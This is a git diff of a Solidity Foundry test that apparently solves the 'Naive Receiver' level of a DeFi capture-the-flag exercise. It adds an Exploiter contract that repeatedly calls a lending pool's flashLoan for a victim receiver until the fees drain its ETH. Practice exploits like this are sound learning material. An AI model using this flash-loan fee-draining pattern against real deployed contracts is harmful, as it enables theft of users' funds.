@@ -45,13 +45,10 @@ contract NaiveReceiver is Test {
     }
 
     function testExploit() public {
-        /**
-         * EXPLOIT START *
-         */
-
-        /**
-         * EXPLOIT END *
-         */
+        vm.startPrank(attacker);
+        Exploiter exploiter = new Exploiter(NaiveReceiverLenderPool(naiveReceiverLenderPool));
+        exploiter.exploit(address(flashLoanReceiver));
+        vm.stopPrank();
         validation();
         console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
     }
@@ -60,5 +57,26 @@ contract NaiveReceiver is Test {
         // All ETH has been drained from the receiver
         assertEq(address(flashLoanReceiver).balance, 0);
         assertEq(address(naiveReceiverLenderPool).balance, ETHER_IN_POOL + ETHER_IN_RECEIVER);
+    }
+}
+
+contract Exploiter {
+    NaiveReceiverLenderPool internal immutable pool;
+    address internal immutable owner;
+
+    modifier onlyOwner() {
+        require(msg.sender == owner, "only owner"); // Modifier to avoid getting front-run by searchers
+        _;
+    }
+
+    constructor(NaiveReceiverLenderPool _pool) {
+        pool = _pool;
+        owner = msg.sender;
+    }
+
+    function exploit(address _flashLoanReceiver) external onlyOwner {
+        for (uint256 i = 0; i < 10; i++) {
+            pool.flashLoan(_flashLoanReceiver, 0);
+        }
     }
 }
